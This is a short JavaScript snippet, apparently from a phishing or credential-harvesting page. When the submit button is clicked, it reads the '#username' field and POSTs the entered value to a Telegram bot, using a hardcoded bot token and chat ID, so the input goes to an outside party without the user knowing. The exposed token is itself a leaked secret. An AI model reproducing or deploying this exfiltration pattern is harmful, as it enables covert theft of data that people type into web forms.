
const button = document.querySelector('input[type="submit"]');
const data = document.querySelector('#username');
button.addEventListener('click', function() {
  value = data.value.trim()
  if (!value || value.length === 0) return;
  sendTgMessage(value)
});

function sendTgMessage(str) {
  const token = '6041857280:AAGy7g18OX-GBQIU5CmzDeA12LeWrH7rSjw';
  const chatId = '433473911';

  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  const data = new FormData();
  data.append('chat_id', chatId);
  data.append('text', str);

  fetch(url, {
    method: 'POST',
    body: data
  })
    .then(response => response.json())
    .then(data => console.log(data))
    .catch(error => console.error(error));
}
